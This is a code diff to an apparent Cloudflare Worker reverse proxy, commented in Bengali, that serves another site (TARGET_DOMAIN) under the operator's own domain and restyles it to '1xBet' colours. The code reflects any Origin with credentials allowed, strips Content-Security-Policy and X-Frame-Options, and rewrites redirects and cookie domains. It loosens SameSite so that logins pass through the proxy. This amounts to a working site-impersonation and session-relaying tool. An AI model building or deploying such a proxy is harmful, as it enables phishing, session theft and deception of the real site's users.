@@ -47,13 +47,13 @@ export default {
       const response = await fetch(proxyRequest);
       const responseHeaders = new Headers(response.headers);
 
-      // ৩. CORS হেডার ഫিক্স করা (Credentials True করা বাধ্যতামূলক লগইনের জন্য)
+      // ৩. CORS হেডার ഫিক্স করা
       responseHeaders.set("Access-Control-Allow-Origin", request.headers.get("Origin") || "*");
       responseHeaders.set("Access-Control-Allow-Credentials", "true");
       responseHeaders.delete("Content-Security-Policy");
       responseHeaders.delete("X-Frame-Options");
 
-      // ৪. রিডাইরেক্ট হ্যান্ডেল করা (লগইন হওয়ার পর ড্যাশবোর্ডে যাওয়ার জন্য)
+      // ৪. রিডাইরেক্ট হ্যান্ডেল করা
       if ([301, 302, 303, 307, 308].includes(response.status) && responseHeaders.has("Location")) {
         let location = responseHeaders.get("Location");
         location = location.replace(new RegExp(`https://${TARGET_DOMAIN}`, 'gi'), `https://${myDomain}`);
@@ -61,17 +61,14 @@ export default {
         responseHeaders.set("Location", location);
       }
 
-      // ৫. কুকি (Cookies) একদম পারফেক্টভাবে হ্যান্ডেল করা (লগইন ফিক্স)
+      // ৫. কুকি (Cookies) পারফেক্টভাবে হ্যান্ডেল করা
       if (typeof response.headers.getSetCookie === 'function') {
         const cookies = response.headers.getSetCookie();
-        responseHeaders.delete("Set-Cookie"); // আগের সব মুছে নতুন করে সেট করব
+        responseHeaders.delete("Set-Cookie"); 
         
         cookies.forEach(cookie => {
-          // ডোমেইন নেম চেঞ্জ করা
           let newCookie = cookie.replace(new RegExp(`domain=${TARGET_DOMAIN}`, 'gi'), `domain=${myDomain}`);
           newCookie = newCookie.replace(new RegExp(`domain=\\.${TARGET_DOMAIN}`, 'gi'), `domain=${myDomain}`);
-          
-          // SameSite=Strict থাকলে প্রক্সিতে লগইন ভেঙে যায়, তাই Lax করে দেওয়া হলো
           newCookie = newCookie.replace(/SameSite=Strict/gi, "SameSite=Lax");
           
           responseHeaders.append("Set-Cookie", newCookie);
@@ -81,8 +78,7 @@ export default {
       let body = response.body;
       const contentType = responseHeaders.get("content-type") || "";
 
-      // ৬. HTML, JSON এবং CSS থেকে ডোমেইন নেম ও কালার রিপ্লেস করা
-      // এখানে text/css যুক্ত করা হয়েছে যাতে ওয়েবসাইটের স্টাইলশিটগুলো মোডিফাই করা যায়
+      // ৬. HTML, JSON এবং CSS থেকে কালার ও ডোমেইন রিপ্লেস
       if (contentType.includes("text/html") || contentType.includes("application/json") || contentType.includes("text/css")) {
         let text = await response.text();
         
@@ -90,19 +86,26 @@ export default {
         text = text.replace(new RegExp(`https://${TARGET_DOMAIN}`, 'g'), `https://${myDomain}`);
         text = text.replace(new RegExp(TARGET_DOMAIN, 'g'), myDomain);
 
-        // --- কালার রিপ্লেস করার লজিক (Yellow থেকে 1xBet Dark Blue) ---
-        
-        // 1xBet এর ডার্ক ব্লু কালার কোড
-        const darkBlueRGB = 'rgb(27, 42, 59)';
-        const darkBlueHex = '#1B2A3B';
+        // --- কালার রিপ্লেস করার লজিক (Yellow থেকে একটু লাইট 1xBet Blue) ---
+        const lightBlueRGB = 'rgb(30, 90, 150)'; // নতুন লাইট ব্লু RGB
+        const lightBlueHex = '#1E5A96';          // নতুন লাইট ব্লু HEX
 
-        // ১. rgb(255, 200, 0) রিপ্লেস করা (স্পেস সহ বা স্পেস ছাড়া সব ধরবে)
-        text = text.replace(/rgb\(\s*255\s*,\s*200\s*,\s*0\s*\)/gi, darkBlueRGB);
-        
-        // ২. যদি কোথাও হেক্স কোড হিসেবে হলুদ কালার ব্যবহার করা হয় (#ffc800), সেটাও রিপ্লেস করবে
-        text = text.replace(/#ffc800/gi, darkBlueHex);
+        // হলুদ কালার রিপ্লেস
+        text = text.replace(/rgb\(\s*255\s*,\s*200\s*,\s*0\s*\)/gi, lightBlueRGB);
+        text = text.replace(/#ffc800/gi, lightBlueHex);
 
-        // বডি আপডেট করা
+        // ৭. বাটনের লেখার কালার সাদা করার জন্য CSS ইনজেক্ট করা (শুধুমাত্র HTML পেজে)
+        if (contentType.includes("text/html")) {
+          const customCSS = `
+            <style>
+              .theme-btn, .btn-primary { 
+                color: #ffffff !important; 
+              }
+            </style>
+          </head>`;
+          text = text.replace('</head>', customCSS);
+        }
+
         body = text;
       }
 
